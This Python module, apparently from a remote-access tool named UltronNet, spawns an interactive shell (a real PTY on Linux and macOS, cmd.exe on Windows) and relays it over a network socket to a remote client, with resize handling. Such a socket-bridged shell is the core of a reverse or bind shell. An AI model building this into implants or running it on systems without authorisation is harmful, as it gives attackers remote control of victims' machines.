"""
ultronnet.features.pty_handler
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Full interactive PTY shell over a socket.

On POSIX (Linux / macOS) this module uses the real pseudo-terminal API
so the remote client gets a proper terminal (readline, tab-completion,
colour output, resizable window).

On Windows it falls back to a piped ``cmd.exe`` subprocess because the
Windows Console API does not expose a POSIX-compatible PTY.

OS / System-call notes
-----------------------
``pty.fork()``
    Creates a child process attached to a new pseudo-terminal pair.
    Returns ``(pid, fd_master)`` in the parent; child has pid == 0.
    The child's stdin/stdout/stderr are all wired to the slave side of
    the PTY automatically by the kernel.

``os.execv(shell, [shell])``
    In the child: replace the process image with the user's login shell.
    The PTY slave becomes the new controlling terminal.

``select.select([fd_master, sock], ...)``
    Multiplexes the PTY master file descriptor and the network socket
    so data flows in both directions without busy-waiting.

``fcntl.ioctl(fd_master, termios.TIOCSWINSZ, ...)``
    Forwards terminal window-resize events (SIGWINCH) into the PTY so
    terminal-aware programs (vim, htop, …) reflow correctly.

``signal.SIGWINCH``
    Sent to the process group leader whenever the terminal window is
    resized.  We register a handler to propagate the new geometry into
    the PTY slave.

Imports
-------
  stdlib : os, select, signal, struct, subprocess, sys, threading, platform
  intra  : ultronnet.config (CFG only)
"""

import logging
import os
import platform
import select
import signal
import struct
import subprocess
import sys
import threading

from ultronnet.config import CFG

log = logging.getLogger("UltronNet")

# ── PTY availability detection ─────────────────────────────────────────────
PTY_AVAILABLE = False
if platform.system() != "Windows":
    try:
        import fcntl
        import pty
        import termios
        import tty  # noqa: F401 — imported to confirm full PTY support

        PTY_AVAILABLE = True
    except ImportError:
        pass


class PTYHandler:
    """Provides a full interactive PTY shell bridged over a socket.

    Usage::

        PTYHandler.spawn_pty(client_socket)

    The method automatically selects the Unix PTY path or the Windows
    ``cmd.exe`` fallback based on platform capabilities.
    """

    @staticmethod
    def spawn_pty(client_socket) -> None:
        """Spawn an interactive shell and bridge it with *client_socket*.

        Parameters
        ----------
        client_socket:
            A connected TCP socket (may be an ``ssl.SSLSocket``).
        """
        if PTY_AVAILABLE:
            PTYHandler._unix_pty(client_socket)
        else:
            PTYHandler._windows_shell(client_socket)

    # ── Unix PTY path ──────────────────────────────────────────────────
    @staticmethod
    def _unix_pty(sock) -> None:
        """Fork a child process with a real PTY and bridge it to *sock*."""
        shell = os.environ.get("SHELL", "/bin/bash")

        # pty.fork() creates a PTY pair and forks.
        # Child  → pid == 0, execv replaces the image with the shell.
        # Parent → pid > 0, fd_master is the master side of the PTY.
        pid, fd_master = pty.fork()

        if pid == 0:
            # ── Child ──────────────────────────────────────────────────
            os.execv(shell, [shell])

        # ── Parent ────────────────────────────────────────────────────
        log.info("PTY shell spawned (pid=%d, shell=%s)", pid, shell)

        def _resize_pty(_sig, _frame) -> None:
            """Propagate SIGWINCH terminal resize into the PTY slave."""
            try:
                cols, rows = os.get_terminal_size()
                fcntl.ioctl(
                    fd_master,
                    termios.TIOCSWINSZ,
                    struct.pack("HHHH", rows, cols, 0, 0),
                )
            except Exception:
                pass

        # Register SIGWINCH handler (only valid in the main thread)
        if hasattr(signal, "SIGWINCH"):
            try:
                signal.signal(signal.SIGWINCH, _resize_pty)
            except ValueError:
                pass  # Not the main thread — skip

        try:
            while True:
                r, _, _ = select.select([fd_master, sock], [], [], 0.5)

                # Data coming out of the PTY → send to remote client
                if fd_master in r:
                    try:
                        data = os.read(fd_master, CFG.BUFFER_SIZE)
                    except OSError:
                        break
                    if not data:
                        break
                    sock.sendall(data)

                # Data coming from remote client → write into PTY input
                if sock in r:
                    try:
                        data = sock.recv(CFG.BUFFER_SIZE)
                    except OSError:
                        break
                    if not data:
                        break
                    os.write(fd_master, data)

        except (OSError, BrokenPipeError):
            pass
        finally:
            os.waitpid(pid, os.WNOHANG)
            os.close(fd_master)
            log.info("PTY shell session ended.")

    # ── Windows fallback ───────────────────────────────────────────────
    @staticmethod
    def _windows_shell(sock) -> None:
        """Spawn ``cmd.exe`` with piped I/O and bridge it to *sock*."""
        proc = subprocess.Popen(
            ["cmd.exe"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        log.info("Windows cmd.exe shell spawned (pid=%d)", proc.pid)
        stop = threading.Event()

        def _read_output() -> None:
            """Forward cmd.exe output → socket."""
            while not stop.is_set():
                data = proc.stdout.read(CFG.BUFFER_SIZE)
                if not data:
                    break
                try:
                    sock.sendall(data)
                except OSError:
                    break
            stop.set()

        def _write_input() -> None:
            """Forward socket input → cmd.exe stdin."""
            while not stop.is_set():
                r, _, _ = select.select([sock], [], [], 0.5)
                if r:
                    try:
                        data = sock.recv(CFG.BUFFER_SIZE)
                    except OSError:
                        break
                    if not data:
                        break
                    proc.stdin.write(data)
                    proc.stdin.flush()
            stop.set()

        t1 = threading.Thread(target=_read_output, daemon=True)
        t2 = threading.Thread(target=_write_input, daemon=True)
        t1.start(); t2.start()
        t1.join(); t2.join()
        proc.terminate()
        log.info("Windows shell session ended.")
